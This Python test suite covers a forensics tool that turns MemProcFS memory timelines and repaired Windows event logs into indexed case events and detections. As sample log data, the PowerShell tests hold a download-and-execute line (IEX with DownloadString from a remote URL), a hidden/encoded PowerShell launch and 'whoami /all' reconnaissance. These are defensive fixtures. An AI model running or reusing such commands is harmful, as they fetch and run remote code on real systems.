"""MemProcFS forensic timelines as case Timeline events (app.services.memory.memprocfs_timeline).

Sample rows are MemProcFS 5.19's own format (\\forensic\\csv\\timeline_*.csv) from a real Windows
11 24H2 image.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.services.memory import memprocfs_findevil, memprocfs_runner, memprocfs_timeline
from app.services.memory.memprocfs_timeline import timeline_event, timeline_events

HEADER = "Time,Type,Action,PID,Value32,Value64,Text,Pad\n"
SAMPLES = {
    "ntfs": '"2025-03-07 19:41:39",NTFS,MOD,0,0x0,0x110f2bc00,"\\1\\Users\\Robert Paulson\\Desktop\\backup.exe","   "\n',
    "registry": '"2025-03-07 19:41:39",REG,MOD,0,0x0,0x0,\\ControlSet001\\Services\\bam\\State\\UserSettings\\S-1-5-21-1,"   "\n',
    "eventlog": '"2025-03-07 19:41:12",EVTX,---,5152,0xd3,0x154,"log:[Security.evtx] provider:[Microsoft-Windows-Security-Auditing] channel:[Security] event:4688 level:0 record:340 data:[NewProcessName=C:\\Windows\\System32\\cmd.exe; SubjectUserName=bob]","   "\n',
    "web": '"2025-03-07 19:40:35",WEB,CRE,9228,0x0,0x0,"browser:[EDGE] type:[VISIT] url:[https://example.org/a?b=c] info:[Example]","   "\n',
    "task": '"2025-03-07 19:41:30",ShTask,RD,0,0x0,0x0,"Updater - [%windir%\\system32\\updater.exe :: /quiet] (LocalService)","   "\n',
    "amcache": '"2025-03-07 19:41:23",AMCA,MOD,0,0x108,0x99f48,"AmCache file inventory record updated: c:\\users\\robert paulson\\desktop\\dumpit.exe","   "\n',
    "kernelobject": '"2025-03-07 19:41:25",KObj,CRE,0,0x0,0xffff848590f6dea0,\\\\GLOBAL??\\DumpIt,"   "\n',
}


def _event(timeline: str) -> dict:
    import csv
    import io

    row = next(csv.DictReader(io.StringIO(HEADER + SAMPLES[timeline])))
    document = timeline_event(row, timeline=timeline, case_id="case-1", evidence_id="ev-1", scan_run_id="run-1")
    assert document is not None
    return document


def test_every_event_is_a_dated_memprocfs_case_event() -> None:
    for timeline in SAMPLES:
        document = _event(timeline)
        assert document["@timestamp"].endswith("Z") and document["@timestamp"].startswith("2025-03-07T19:4")
        assert document["artifact"] == {"type": f"memprocfs_{timeline}", "name": document["artifact"]["name"], "parser": "memprocfs", "source_path": f"\\forensic\\csv\\timeline_{timeline}.csv"}
        assert document["case_id"] == "case-1" and document["evidence_id"] == "ev-1"
        assert document["event"]["message"] and document["event"]["message"] in document["search_text"]
        assert document["event_id"].startswith("memprocfs-")


def test_ids_are_stable_so_a_new_scan_replaces_the_same_events() -> None:
    assert _event("ntfs")["event_id"] == _event("ntfs")["event_id"]
    assert _event("ntfs")["event_id"] != _event("registry")["event_id"]


def test_ntfs_rows_name_the_file_without_the_volume_number() -> None:
    document = _event("ntfs")
    assert document["file"]["path"] == "\\Users\\Robert Paulson\\Desktop\\backup.exe"
    assert document["file"]["name"] == "backup.exe" and document["file"]["extension"] == "exe"
    assert document["event"]["type"] == "file_modified"


def test_event_log_rows_keep_the_event_id_channel_and_data() -> None:
    document = _event("eventlog")
    assert document["windows"]["event_id"] == 4688
    assert document["windows"]["channel"] == "Security" and document["event"]["provider"] == "Microsoft-Windows-Security-Auditing"
    assert "NewProcessName=C:\\Windows\\System32\\cmd.exe" in document["windows"]["event_data_summary"]
    # Normalized as the disk parser reads a 4688: a process creation, with its program and user.
    assert document["event"]["type"] == "process_start" and document["event"]["category"] == "process"
    assert document["process"]["pid"] == "5152" and document["process"]["name"] == "cmd.exe"
    assert document["user"]["name"] == "bob"
    assert "memory" in document["tags"] and "memprocfs" in document["tags"]


def _row(timeline: str, text: str, time: str = "2025-03-07 19:37:27") -> dict:
    return {"Time": time, "Type": "X", "Action": "---", "PID": "0", "Value32": "0x0", "Value64": "0x0", "Text": text}


DEFENDER_1116 = (
    "log:[Microsoft-Windows-Windows Defender%4Operational.evtx] provider:[Microsoft-Windows-Windows Defender] "
    "channel:[Microsoft-Windows-Windows Defender/Operational] event:1116 level:3 record:147 data:[Product Name=Microsoft Defender Antivirus; "
    "Threat Name=Trojan:Win32/Wacatac.B!ml; Severity Name=Severe; Category Name=Trojan; Detection User=PC\\alice; "
    "Path=file:_C:\\Users\\alice\\Downloads\\invoice.exe; Action Name=Not Applicable]"
)


def test_memory_event_log_records_get_the_detections_their_evtx_copy_gets() -> None:
    from app.workers.tasks import _builtin_detection_from_document

    document = timeline_event(_row("eventlog", DEFENDER_1116), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert document["artifact"]["type"] == "memprocfs_eventlog" and document["artifact"]["parser"] == "memprocfs"
    assert document["event"]["category"] == "detection" and "defender" in document["tags"]
    assert document["risk_score"] > 0 and document["suspicious_reasons"]
    assert memprocfs_timeline.detection_candidates([document]) == [document]
    assert _builtin_detection_from_document(document) is not None


def test_a_record_the_disk_normalizer_does_not_know_keeps_its_data_in_the_message() -> None:
    text = "log:[System.evtx] provider:[Some-Provider] channel:[System] event:9999 level:4 record:1 data:[Key=Value; Other=Thing]"
    document = timeline_event(_row("eventlog", text), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert document["event"]["message"] == "System event 9999: Key=Value; Other=Thing"
    assert memprocfs_timeline.detection_candidates([document]) == []


def test_memory_amcache_entries_are_judged_like_disk_amcache() -> None:
    from app.workers.tasks import _builtin_detection_from_document

    downloaded = timeline_event(_row("amcache", "AmCache file inventory record updated: c:\\users\\alice\\downloads\\invoice.exe"), timeline="amcache", case_id="c", evidence_id="e", scan_run_id="r")
    assert downloaded["artifact"]["type"] == "memprocfs_amcache"
    assert _builtin_detection_from_document(downloaded)[0] == "amcache_executable_in_downloads"
    installed = timeline_event(_row("amcache", "AmCache file inventory record updated: c:\\program files\\vendor\\app.exe"), timeline="amcache", case_id="c", evidence_id="e", scan_run_id="r")
    assert memprocfs_timeline.detection_candidates([installed]) == []


def test_a_created_prefetch_file_records_the_program_run() -> None:
    document = timeline_event(
        {**_row("ntfs", "\\1\\Windows\\Prefetch\\INVOICE.EXE-AB6C9DDF.pf"), "Action": "CRE"}, timeline="ntfs", case_id="c", evidence_id="e", scan_run_id="r"
    )
    assert document["event"]["type"] == "prefetch_file_created" and document["event"]["category"] == "execution"
    assert document["process"]["name"] == "INVOICE.EXE"
    modified = timeline_event({**_row("ntfs", "\\1\\Windows\\Prefetch\\INVOICE.EXE-AB6C9DDF.pf"), "Action": "MOD"}, timeline="ntfs", case_id="c", evidence_id="e", scan_run_id="r")
    assert modified["event"]["type"] == "file_modified"


def test_ntfs_records_are_not_put_through_the_mft_normalizer() -> None:
    document = timeline_event(
        {**_row("ntfs", "\\1\\Users\\alice\\AppData\\Local\\Vendor\\helper.dll"), "Action": "CRE"}, timeline="ntfs", case_id="c", evidence_id="e", scan_run_id="r"
    )
    assert document["risk_score"] == 0 and memprocfs_timeline.detection_candidates([document]) == []


def test_web_task_amcache_and_registry_rows_are_structured() -> None:
    web = _event("web")
    assert web["url"]["full"] == "https://example.org/a?b=c" and web["browser"]["browser"] == "edge"
    task = _event("task")
    assert task["task"] == {"name": "Updater", "command": "%windir%\\system32\\updater.exe", "arguments": "/quiet", "run_as": "LocalService"}
    assert "last run" in task["event"]["message"]
    amcache = _event("amcache")
    assert amcache["amcache"]["file_path"] == "c:\\users\\robert paulson\\desktop\\dumpit.exe"
    registry = _event("registry")
    assert registry["registry"]["key_path"].startswith("\\ControlSet001\\Services\\bam")


def test_rows_without_a_usable_time_are_skipped(tmp_path: Path) -> None:
    (tmp_path / "timeline_ntfs.csv").write_text(HEADER + ',NTFS,MOD,0,0x0,0x0,\\1\\x,""\n' + '"1601-01-01 00:00:00",NTFS,MOD,0,0x0,0x0,\\1\\y,""\n' + SAMPLES["ntfs"])
    events = list(timeline_events(tmp_path, case_id="c", evidence_id="e", scan_run_id="r"))
    assert [document["file"]["name"] for _, document in events] == ["backup.exe"]


def test_bulky_timelines_come_last_so_the_cap_falls_on_them(tmp_path: Path) -> None:
    for timeline, row in SAMPLES.items():
        (tmp_path / f"timeline_{timeline}.csv").write_text(HEADER + row * 3)
    events = list(timeline_events(tmp_path, case_id="c", evidence_id="e", scan_run_id="r", limit=18))
    assert len(events) == 18
    assert {timeline for timeline, _ in events} == {"eventlog", "task", "web", "amcache", "kernelobject", "registry"}


def test_indexing_replaces_the_evidence_events_in_batches(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.core import opensearch

    for timeline, row in SAMPLES.items():
        (tmp_path / f"timeline_{timeline}.csv").write_text(HEADER + row * 2)
    batches: list[int] = []
    calls: list[str] = []
    monkeypatch.setattr(memprocfs_timeline, "BATCH_SIZE", 5)
    monkeypatch.setattr(memprocfs_timeline, "_delete_previous", lambda case_id, evidence_id: calls.append(f"delete:{evidence_id}") or 7)
    monkeypatch.setattr(opensearch, "ensure_case_index", lambda case_id: "dfir-events-c")
    monkeypatch.setattr(opensearch, "refresh_index", lambda *a, **k: calls.append("refresh"))

    def fake_bulk(case_id, documents, **kwargs):
        calls.append("bulk")
        batches.append(len(documents))
        assert all(document["artifact"]["parser"] == "memprocfs" for document in documents)
        return {"success": True, "documents_indexed": len(documents)}

    monkeypatch.setattr(opensearch, "bulk_index_events_with_report", fake_bulk)
    detected: list[int] = []
    monkeypatch.setattr(memprocfs_timeline, "create_timeline_detections", lambda db, **kwargs: detected.append(len(kwargs["candidates"])) or {"builtin": 1})
    report = memprocfs_timeline.index_memprocfs_timeline(tmp_path, case_id="c", evidence_id="e", scan_run_id="r")
    assert not detected and "detections" not in report
    report = memprocfs_timeline.index_memprocfs_timeline(tmp_path, case_id="c", evidence_id="e", scan_run_id="r", db=object())
    assert report["detections"] == {"builtin": 1} and detected == [2]
    batches.clear()
    calls[:] = calls[: calls.index("refresh") + 1]
    calls[: calls.index("refresh") + 1] = []
    report = memprocfs_timeline.index_memprocfs_timeline(tmp_path, case_id="c", evidence_id="e", scan_run_id="r")
    assert report["indexed"] == 14 and report["replaced"] == 7 and not report["truncated"]
    assert report["by_timeline"]["ntfs"] == 2
    assert batches == [5, 5, 4]
    assert calls[0] == "delete:e" and calls[-1] == "refresh"


def test_nothing_saved_means_nothing_touched(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(memprocfs_timeline, "_delete_previous", lambda *a: pytest.fail("must not delete"))
    assert memprocfs_timeline.index_memprocfs_timeline(tmp_path / "missing", case_id="c", evidence_id="e", scan_run_id="r")["indexed"] == 0


def test_runner_asks_the_child_to_save_timelines_in_the_run_directory(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    library = tmp_path / "vmm.so"
    library.write_bytes(b"")
    monkeypatch.setattr(memprocfs_runner, "memprocfs_library", lambda: library)
    calls = {}

    def fake_run(argv, **kwargs):
        calls["argv"] = argv
        return b"[]", b"", 0, 10

    monkeypatch.setattr(memprocfs_runner, "run_isolated_process", fake_run)
    memprocfs_runner.run_findevil(tmp_path / "image.dmp", tmp_path, timeout_seconds=600, max_output_bytes=4096)
    assert calls["argv"][calls["argv"].index("--timeline-dir") + 1] == str(tmp_path / memprocfs_runner.TIMELINE_DIRNAME)


def test_child_saves_only_the_timelines_volatility_does_not_give(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    read_paths: list[str] = []

    def fake_read(lib, handle, path, *, limit):
        read_paths.append(path)
        return b"" if "prefetch" in path else HEADER.encode() + path.encode()

    monkeypatch.setattr(memprocfs_findevil, "_read", fake_read)
    memprocfs_findevil._save_timelines(None, 1, str(tmp_path / "out"))
    saved = sorted(path.name for path in (tmp_path / "out").iterdir())
    expected = [f"timeline_{name}.csv" for name in memprocfs_findevil.TIMELINE_FILES] + [f"{name}.csv" for name in memprocfs_findevil.TABLE_FILES]
    assert saved == sorted(name for name in expected if "prefetch" not in name)
    assert not any(name in " ".join(read_paths) for name in ("timeline_process", "timeline_net", "timeline_thread", "handles.csv", "modules.csv", "threads.csv"))
    assert set(memprocfs_findevil.TIMELINE_FILES) == set(memprocfs_timeline.TIMELINES)


def test_execution_indexes_saved_timelines_without_failing_the_run(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from types import SimpleNamespace

    from app.services.memory import execution

    run = SimpleNamespace(id="run-1", case_id="case-1", evidence_id="ev-1")
    monkeypatch.setattr(execution, "index_memprocfs_timeline", lambda directory, **kwargs: {"indexed": 3, "directory": directory.name, **kwargs})
    assert execution._index_memprocfs_timeline(None, run, tmp_path)["indexed"] == 3

    def broken(*_a, **_k):
        raise RuntimeError("opensearch down")

    monkeypatch.setattr(execution, "index_memprocfs_timeline", broken)
    report = execution._index_memprocfs_timeline(None, run, tmp_path)
    assert report["indexed"] == 0 and "opensearch down" in report["error"]


def test_timeline_quick_filter_selects_every_memprocfs_timeline() -> None:
    from app.services import search_service, timeline_service

    quick = next(item for item in timeline_service.TIMELINE_QUICK_FILTERS if item["id"] == "memory_memprocfs")
    assert set(memprocfs_timeline.ARTIFACT_TYPES) <= set(search_service._artifact_type_values(quick["params"]["artifact_type"]))


def test_full_timeline_filter_understands_the_memprocfs_alias() -> None:
    from app.services import timeline_service

    item = {"kind": "event", "artifact_type": "memprocfs_eventlog"}
    assert timeline_service._matches_timeline_filters(item, {"artifact_type": ["memprocfs"]})
    assert not timeline_service._matches_timeline_filters({"kind": "event", "artifact_type": "mft"}, {"artifact_type": ["memprocfs"]})


def _eventlog_row(event_id: int, provider: str, channel: str, data: str) -> dict:
    text = f"log:[x.evtx] provider:[{provider}] channel:[{channel}] event:{event_id} level:5 record:9 data:[{data}]"
    return {"Time": "2025-03-07 19:40:01", "Type": "EVTX", "Action": "---", "PID": "5404", "Value32": "0x1", "Value64": "0x2", "Text": text}


def test_powershell_script_blocks_become_powershell_commands() -> None:
    script = "$c = New-Object Net.WebClient; IEX $c.DownloadString('http://x/a.ps1')"
    row = _eventlog_row(4104, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", f"MessageNumber=1; MessageTotal=2; ScriptBlockText={script}; ScriptBlockId=abc-1; Path=")
    document = timeline_event(row, timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert document["powershell"]["command"] == script
    assert document["powershell"]["script_block_id"] == "abc-1" and document["powershell"]["message_total"] == "2"
    assert document["process"]["name"] == "powershell.exe" and document["process"]["pid"] == "5404"
    assert document["windows"]["event_id"] == 4104
    assert "$c = New-Object" in document["event"]["message"]


def test_powershell_command_invocations_and_engine_starts_name_their_command() -> None:
    context = "Severity = Informational\n        Host Name = ConsoleHost\n        Host Application = powershell.exe -nop -w hidden\n        Command Name = Get-LocalUser"
    invocation = timeline_event(_eventlog_row(4103, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", f"ContextInfo={context}; UserData=; Payload=CommandInvocation(Get-LocalUser): \"Get-LocalUser\""), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert invocation["powershell"]["command"] == 'CommandInvocation(Get-LocalUser): "Get-LocalUser"'
    assert invocation["powershell"]["host_application"] == "powershell.exe -nop -w hidden"
    engine = timeline_event(_eventlog_row(400, "PowerShell", "Windows PowerShell", "Available; None; \tNewEngineState=Available\n\tHostApplication=powershell.exe -enc SQBFAFgA\n\tEngineVersion=5.1"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert engine["powershell"]["command"] == "powershell.exe -enc SQBFAFgA"
    pipeline = timeline_event(_eventlog_row(800, "PowerShell", "Windows PowerShell", "whoami; \tHostApplication=powershell.exe\n\tCommandLine=whoami /all\n"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert pipeline["powershell"]["command"] == "whoami /all"


def test_other_event_log_records_are_not_powershell_commands() -> None:
    security = timeline_event(_eventlog_row(4104, "Some-Other-Provider", "Application", "ScriptBlockText=x"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert "command" not in (security.get("powershell") or {})
    empty = timeline_event(_eventlog_row(4104, "Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational", "MessageNumber=1; MessageTotal=1; ScriptBlockText=; ScriptBlockId=z"), timeline="eventlog", case_id="c", evidence_id="e", scan_run_id="r")
    assert "command" not in (empty.get("powershell") or {})


def test_powershell_log_lists_the_evidence_records_oldest_first(monkeypatch: pytest.MonkeyPatch) -> None:
    from app.core import opensearch
    from app.services.memory.evidence_timeline import memory_powershell_log

    bodies: list[dict] = []

    class Client:
        def search(self, index, body, params=None):
            bodies.append(body)
            source = {"event_id": "memprocfs-1", "@timestamp": "2025-03-07T19:40:01Z", "windows": {"event_id": 4104, "channel": "Microsoft-Windows-PowerShell/Operational"}, "process": {"name": "powershell.exe", "pid": "5404"}, "powershell": {"command": "whoami", "message_number": "1", "message_total": "3", "script_block_id": "abc"}}
            return {"hits": {"total": {"value": 1}, "hits": [{"_id": "memprocfs-1", "_source": source}]}}

    monkeypatch.setattr(opensearch, "get_opensearch_client", lambda *a, **k: Client())
    result = memory_powershell_log("c", "e", q="who", page=2, page_size=10)
    assert result["total"] == 1
    assert result["items"][0] == {"id": "memprocfs-1", "timestamp": "2025-03-07T19:40:01Z", "event_id": 4104, "channel": "Microsoft-Windows-PowerShell/Operational", "pid": 5404, "command": "whoami", "host_application": None, "script_block_id": "abc", "part": "1/3"}
    body = bodies[0]
    assert body["from"] == 10 and body["sort"][0] == {"@timestamp": {"order": "asc"}}
    assert {"exists": {"field": "powershell.command"}} in body["query"]["bool"]["filter"]
    assert {"term": {"evidence_id": "e"}} in body["query"]["bool"]["filter"]


# eventlog_repaired\_summary.txt as MemProcFS 5.18+ writes it (wiki FS_Sys_Eventlog).
REPAIRED_SUMMARY = """       # Status   Original   Exposed Chunks Valid Kept Records Unique Duplicates IDs Name
0000 repaired   e00000    ca1000    223   202  202   29614  29614          0 yes Application.evtx
0001 original    11000     11000      1     1    1       0      0          0 yes HardwareEvents.evtx
0002 unavailable     0         0      0     0    0       0      0          0 no  System.evtx
0003 original    11000     11000      1     1    1      12     12          0 yes Internet Explorer.evtx
0005 repaired    b1000     91000     11     9    9     330    330          0 yes Microsoft-Windows-AAD%4Operational.evtx
0006 repaired    b1000     91000     11     9    9     330    330          0 yes ../escape.evtx
"""


def test_only_usable_repaired_logs_are_taken_from_the_summary() -> None:
    assert memprocfs_findevil.repaired_evtx_names(REPAIRED_SUMMARY) == ["Application.evtx", "Internet Explorer.evtx", "Microsoft-Windows-AAD%4Operational.evtx"]
    assert memprocfs_findevil.repaired_evtx_names("") == []


class _FakeVfs:
    """VMMDLL_VfsReadU over an in-memory file system."""

    def __init__(self, files: dict[str, bytes]) -> None:
        self.files = files

    def VMMDLL_VfsReadU(self, handle, path, buffer, size, read, offset):  # noqa: N802
        import ctypes

        data = self.files.get(path.decode("utf-8"))
        if data is None:
            read._obj.value = 0
            return 1
        chunk = data[offset: offset + size]
        ctypes.memmove(buffer, chunk, len(chunk))
        read._obj.value = len(chunk)
        return 0


def test_child_copies_the_repaired_event_logs_and_skips_what_it_cannot_copy_whole(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    base = memprocfs_findevil.EVTX_VFS_DIR
    big = b"E" * (memprocfs_findevil._READ_CHUNK * 2 + 10)
    lib = _FakeVfs({f"{base}\\_summary.txt": REPAIRED_SUMMARY.encode(), f"{base}\\Application.evtx": big, f"{base}\\Internet Explorer.evtx": b"IE"})
    memprocfs_findevil._save_evtx(lib, 1, str(tmp_path))
    folder = tmp_path / memprocfs_findevil.EVTX_SUBDIR
    assert (folder / "Application.evtx").read_bytes() == big
    assert (folder / "Internet Explorer.evtx").read_bytes() == b"IE"
    # Listed but not readable: nothing left behind.
    assert sorted(path.name for path in folder.iterdir()) == ["Application.evtx", "Internet Explorer.evtx"]

    monkeypatch.setattr(memprocfs_findevil, "_MAX_EVTX_FILE_BYTES", memprocfs_findevil._READ_CHUNK)
    memprocfs_findevil._save_evtx(lib, 1, str(tmp_path / "capped"))
    # A truncated copy would not be a valid .evtx file.
    assert sorted(path.name for path in (tmp_path / "capped" / "evtx").iterdir()) == ["Internet Explorer.evtx"]


def test_no_repaired_logs_leaves_no_evtx_folder(tmp_path: Path) -> None:
    memprocfs_findevil._save_evtx(_FakeVfs({}), 1, str(tmp_path))
    assert not (tmp_path / memprocfs_findevil.EVTX_SUBDIR).exists()


def _evtx_xml(record: int, *, event_id: int = 4688, channel: str = "Security", data: str = "<Data Name='NewProcessName'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='CommandLine'>cmd.exe /c whoami</Data><Data Name='SubjectUserName'>bob</Data>") -> str:
    return (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
        f"<Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>{event_id}</EventID><Level>0</Level>"
        f"<TimeCreated SystemTime='2025-03-07 19:41:12.123456'/><EventRecordID>{record}</EventRecordID>"
        f"<Channel>{channel}</Channel><Computer>WS01</Computer></System><EventData>{data}</EventData></Event>"
    )


def test_repaired_event_logs_replace_the_summaries_of_the_records_they_have(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.ingest.raw_parsers import evtx_parser

    (tmp_path / "evtx").mkdir()
    (tmp_path / "evtx" / "Security.evtx").write_bytes(b"ElfFile")
    # Record 340 is in both; 341 only in the summary (MemProcFS did not keep it in the file).
    second = SAMPLES["eventlog"].replace("record:340", "record:341").replace("19:41:12", "19:41:13")
    (tmp_path / "timeline_eventlog.csv").write_text(HEADER + SAMPLES["eventlog"] + second, encoding="utf-8")
    monkeypatch.setattr(evtx_parser, "iter_evtx_xml_record_results", lambda path, **_k: iter([(1, _evtx_xml(340), None), (2, _evtx_xml(340), None)]))

    events = [document for _timeline, document in timeline_events(tmp_path, case_id="case-1", evidence_id="ev-1", scan_run_id="run-1")]
    assert [str(document["windows"]["record_id"]) for document in events] == ["340", "341"]
    full, summary = events
    assert full["memprocfs"]["source"] == "evtx_repaired" and summary["memprocfs"]["source"] == "timeline_csv"
    # Same provenance as the rest of the scan, so a new scan replaces it and the type filters find it.
    assert full["artifact"]["type"] == "memprocfs_eventlog" and full["artifact"]["parser"] == "memprocfs"
    assert full["artifact"]["source_path"] == "\\sys\\eventlog\\eventlog_repaired\\Security.evtx"
    assert {"memory", "memprocfs"} <= set(full["tags"]) and full["memory"]["plugin"] == "memprocfs.timeline"
    # The record's full fields, which the summary line does not carry.
    assert full["windows"]["event_id"] == 4688 and full["process"]["command_line"] == "cmd.exe /c whoami"
    again = next(document for _t, document in timeline_events(tmp_path, case_id="case-1", evidence_id="ev-1", scan_run_id="run-2"))
    assert again["event_id"] == full["event_id"]


def test_an_unreadable_repaired_log_falls_back_to_the_summary(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.ingest.raw_parsers import evtx_parser

    (tmp_path / "evtx").mkdir()
    (tmp_path / "evtx" / "Security.evtx").write_bytes(b"broken")
    (tmp_path / "timeline_eventlog.csv").write_text(HEADER + SAMPLES["eventlog"], encoding="utf-8")

    def broken(path, **_k):
        raise ValueError("not an evtx file")
        yield  # pragma: no cover

    monkeypatch.setattr(evtx_parser, "iter_evtx_xml_record_results", broken)
    events = [document for _t, document in timeline_events(tmp_path, case_id="case-1", evidence_id="ev-1", scan_run_id="run-1")]
    assert [document["memprocfs"]["source"] for document in events] == ["timeline_csv"]


class _FakeEventsIndex:
    """search (host aggregation), helpers.scan and helpers.bulk over a list of event documents."""

    def __init__(self, docs: list[dict]) -> None:
        self.docs = {str(index): doc for index, doc in enumerate(docs)}

    @staticmethod
    def _matches(doc: dict, query: dict) -> bool:
        clauses = query["bool"]
        for clause in clauses.get("filter", []):
            if "term" in clause:
                (field, value), = clause["term"].items()
                current = doc
                for part in field.split("."):
                    current = (current or {}).get(part) if isinstance(current, dict) else None
                if current != value:
                    return False
            if "exists" in clause and not (doc.get("windows") or {}).get(clause["exists"]["field"].split(".")[1]):
                return False
        for clause in clauses.get("must_not", []):
            (field, value), = clause["term"].items()
            if (doc.get("artifact") or {}).get(field.split(".")[1]) == value:
                return False
        return True

    def search(self, index, body):
        hosts: dict[str, int] = {}
        for doc in self.docs.values():
            if self._matches(doc, body["query"]):
                host = doc["host"]["identity_id"]
                hosts[host] = hosts.get(host, 0) + 1
        return {"aggregations": {"hosts": {"buckets": [{"key": key, "doc_count": count} for key, count in hosts.items()]}}}

    def scan(self, client, index, query, size):
        return [{"_index": "idx", "_id": key, "_source": doc} for key, doc in self.docs.items() if self._matches(doc, query["query"])]

    def bulk(self, client, actions, chunk_size, raise_on_error):
        for action in actions:
            self.docs[action["_id"]].setdefault("memprocfs", {}).update(action["doc"]["memprocfs"])
        return len(actions), []


def _event_doc(host: str, channel: str, record: str, *, memory: bool) -> dict:
    windows = {"channel": channel, ("record_id" if memory else "record_number"): record}
    artifact = {"type": "memprocfs_eventlog", "parser": "memprocfs"} if memory else {"type": "windows_event", "parser": "evtx_raw"}
    return {"host": {"identity_id": host}, "windows": windows, "artifact": artifact, **({"memprocfs": {}} if memory else {})}


def test_memory_event_log_copies_of_disk_records_of_the_same_host_are_marked(monkeypatch: pytest.MonkeyPatch) -> None:
    from opensearchpy import helpers

    from app.core import opensearch

    fake = _FakeEventsIndex([
        _event_doc("ws01", "Security", "10", memory=True),
        _event_doc("ws01", "Microsoft-Windows-PowerShell/Operational", "11", memory=True),
        _event_doc("ws01", "security", "10", memory=False),
        # Same record number, other host: not the same record.
        _event_doc("srv01", "Microsoft-Windows-PowerShell/Operational", "11", memory=False),
    ])
    monkeypatch.setattr(opensearch, "get_opensearch_client", lambda timeout_seconds=None: fake)
    monkeypatch.setattr(opensearch, "index_exists", lambda client, index: True)
    monkeypatch.setattr(opensearch, "refresh_index", lambda *a, **k: None)
    monkeypatch.setattr(helpers, "scan", fake.scan)
    monkeypatch.setattr(helpers, "bulk", fake.bulk)

    report = memprocfs_timeline.mark_event_log_copies("case-1")
    # Only the record whose flag changes is rewritten; no flag already reads as "not on disk".
    assert report == {"memory_records": 2, "on_disk": 1, "updated": 1}
    assert fake.docs["0"]["memprocfs"]["on_disk"] is True and not fake.docs["1"]["memprocfs"].get("on_disk")
    # The disk copy goes away (that evidence deleted and the case re-checked): the flag is cleared.
    del fake.docs["2"]
    assert memprocfs_timeline.mark_event_log_copies("case-1")["updated"] == 1 and fake.docs["0"]["memprocfs"]["on_disk"] is False
    # Run again with nothing new: nothing is rewritten.
    assert memprocfs_timeline.mark_event_log_copies("case-1")["updated"] == 0
